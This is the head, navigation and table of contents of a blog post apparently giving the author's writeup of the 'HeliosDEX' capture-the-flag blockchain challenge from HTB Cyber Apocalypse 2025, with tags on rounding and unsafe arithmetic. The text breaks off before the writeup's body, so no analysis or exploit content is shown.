<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup] &#183; simonedimaria's blog</title><meta name=title content="HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup] &#183; simonedimaria's blog"><meta name=description content='Author writeup for the "HeliosDEX" easy blockchain challenge from HTB Cyber Apocalypse 2025.'><meta name=keywords content="authored,DEX,rounding,unsafe-arithmetic,"><link rel=canonical href=https://simonedimaria.xyz/posts/htb-cyberapocalypse-2025/heliosdex/><meta name=author content="simonedimaria"><link href=https://x.com/dimariasimone rel=me><link href=https://github.com/simonedimaria rel=me><meta property="og:url" content="https://simonedimaria.xyz/posts/htb-cyberapocalypse-2025/heliosdex/"><meta property="og:site_name" content="simonedimaria's blog"><meta property="og:title" content="HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup]"><meta property="og:description" content="Author writeup for the â€œHeliosDEXâ€ easy blockchain challenge from HTB Cyber Apocalypse 2025."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-03-15T00:00:00+01:00"><meta property="article:modified_time" content="2025-03-15T00:00:00+01:00"><meta property="article:tag" content="Authored"><meta property="article:tag" content="DEX"><meta property="article:tag" content="Rounding"><meta property="article:tag" content="Unsafe-Arithmetic"><meta property="og:image" content="https://simonedimaria.xyz/posts/htb-cyberapocalypse-2025/heliosdex/featured_htb_ca25_banner.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://simonedimaria.xyz/posts/htb-cyberapocalypse-2025/heliosdex/featured_htb_ca25_banner.png"><meta name=twitter:title content="HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup]"><meta name=twitter:description content="Author writeup for the â€œHeliosDEXâ€ easy blockchain challenge from HTB Cyber Apocalypse 2025."><link type=text/css rel=stylesheet href=/css/main.bundle.min.952cc647d4f186c59ed07b5684e5ff442e04b033940e76cd8eba3a6c51251b07588d9c7b14636937cbde18a1ba69be3b8055148a0d1e2e6c17c46d564fb6ecbf.css integrity="sha512-lSzGR9TxhsWe0HtWhOX/RC4EsDOUDnbNjro6bFElGwdYjZx7FGNpN8veGKG6ab47gFUUig0eLmwXxG1WT7bsvw=="><script type=text/javascript src=/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script type=text/javascript src=/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js integrity="sha512-mBTe6WFNMq61YjnRGO3+IKzWIxQk+bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.9cc802d09f28c6af56ceee7bc6e320a39251fdae98243f2a9942f221ac57a9f49c51609699a91794a7b2580ee1deaa8e4d794a68ffa94aa317c66e893ce51e02.js integrity="sha512-nMgC0J8oxq9Wzu57xuMgo5JR/a6YJD8qmULyIaxXqfScUWCWmakXlKeyWA7h3qqOTXlKaP+pSqMXxm6JPOUeAg==" data-copy=Copy data-copied=Copied></script><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Blog","name":"HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup]","headline":"HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup]","abstract":"Author writeup for the \u0026ldquo;HeliosDEX\u0026rdquo; easy blockchain challenge from HTB Cyber Apocalypse 2025.","inLanguage":"en","url":"https:\/\/simonedimaria.xyz\/posts\/htb-cyberapocalypse-2025\/heliosdex\/","author":{"@type":"Person","name":"simonedimaria"},"copyrightYear":"2025","dateCreated":"2025-03-15T00:00:00\u002b01:00","datePublished":"2025-03-15T00:00:00\u002b01:00","dateModified":"2025-03-15T00:00:00\u002b01:00","keywords":["authored","DEX","rounding","unsafe-arithmetic"],"mainEntityOfPage":"true","wordCount":"1704"}]</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 z-100"><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div><div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32"><div class="main-menu flex items-center justify-between py-6 md:justify-start gap-x-3 pt-[2px] pr-2 md:pr-4 pb-[3px] pl-0"><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium">simonedimaria&rsquo;s blog</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/posts/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Blog title=Blog><p class="text-base font-medium">Blog</p></a><a href=/tags/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Tags title=Tags><p class="text-base font-medium">Tags</p></a><a href=https://x.com/dimariasimone target=_blank class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=x-twitter title><span><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
</span></a><a href=https://github.com/simonedimaria target=_blank class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=github title><span><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a href class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" title></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/posts/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Blog title=Blog><p class="text-bg font-bg">Blog</p></a></li><li class=mt-1><a href=/tags/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Tags title=Tags><p class="text-bg font-bg">Tags</p></a></li><li class=mt-1><a href=https://x.com/dimariasimone target=_blank class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=x-twitter title><div><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></div></a></li><li class=mt-1><a href=https://github.com/simonedimaria target=_blank class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=github title><div><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></div></a></li><li class=mt-1><a href class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" title></a></li></ul></div></div></div></div><script>(function(){var e=$(".main-menu"),t=window.location.pathname;e.find('a[href="'+t+'"]').each(function(e,t){$(t).children("p").addClass("active")})})()</script></div></div><script type=text/javascript src=/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js integrity="sha512-AKV8c+oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ+pkPSYl5ixQYmehaQ==" data-blur-id=menu-blur></script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><figure><img src=/posts/htb-cyberapocalypse-2025/heliosdex/background_heliosdex_banner_hu_cefe5bd2d3c5f08b.png alt="HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup]" loading=eager decoding=async fetchpriority=high class="w-full rounded-lg single_hero_round nozoom"></figure><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/></a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Blog</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/htb-cyberapocalypse-2025/heliosdex/>HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup]</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup]</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-03-15T00:00:00+01:00>15 March 2025</time><span class="px-2 text-primary-500">&#183;</span><span>1704 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">8 mins</span><span class="px-2 text-primary-500">&#183;</span><span class=mb-[2px]>
<span id=zen-mode-button class="text-lg hover:text-primary-500" title="Enable zen mode" data-title-i18n-disable="Enable zen mode" data-title-i18n-enable="Disable zen mode"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 50 50" width="50" height="50"><path fill="currentColor" d="M12.980469 4C9.1204688 4 5.9804688 7.14 5.9804688 11L6 26H9.9804688V11c0-1.65 1.3400002-3 3.0000002-3H40.019531c1.66.0 3 1.35 3 3V39c0 1.65-1.34 3-3 3H29c0 1.54-.579062 2.94-1.539062 4H40.019531c3.86.0 7-3.14 7-7V11c0-3.86-3.14-7-7-7H12.980469zM7 28c-2.206.0-4 1.794-4 4V42c0 2.206 1.794 4 4 4H23c2.206.0 4-1.794 4-4V32c0-2.206-1.794-4-4-4H7zm0 4H23L23.001953 42H7V32z"/></svg></span></span></span></span></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/categories/blockchain/","_self"),!1'><span class=flex style=cursor:pointer><span class="bg-amber-700 rounded-full border-2 border-neutral-200 px-3 py-1 text-sm font-normal text-neutral-200 dark:border-neutral-400 dark:text-neutral-200">ðŸ”— Blockchain
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/authored/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Authored
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/dex/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">DEX
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/rounding/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Rounding
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/unsafe-arithmetic/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Unsafe-Arithmetic</span></span></span></div></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4" width=96 height=96 alt=simonedimaria src=/img/gatto-stregone-ciccione_hu_69c1c100a967a305.jpeg data-zoom-src=/img/gatto-stregone-ciccione.jpeg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">simonedimaria</div><div class="text-sm text-neutral-700 dark:text-neutral-400"><em>I make a bunch of electrons dance on some rock to hack stuff</em></div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://x.com/dimariasimone target=_blank aria-label=X-Twitter title=X-Twitter rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></span></a>
<a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/simonedimaria target=_blank aria-label=Github title=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs"><div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#tldr>TLDR</a></li><li><a href=#description>Description</a></li><li><a href=#skills-required>Skills Required</a></li><li><a href=#skills-learned>Skills Learned</a></li><li><a href=#challenge-scenario>Challenge Scenario</a></li><li><a href=#analyzing-the-source-code>Analyzing the Source Code</a><ul><li><a href=#setupsol><code>Setup.sol</code></a></li><li><a href=#heliosdexsol><code>HeliosDEX.sol</code></a></li></ul></li><li><a href=#exploitation>Exploitation</a></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 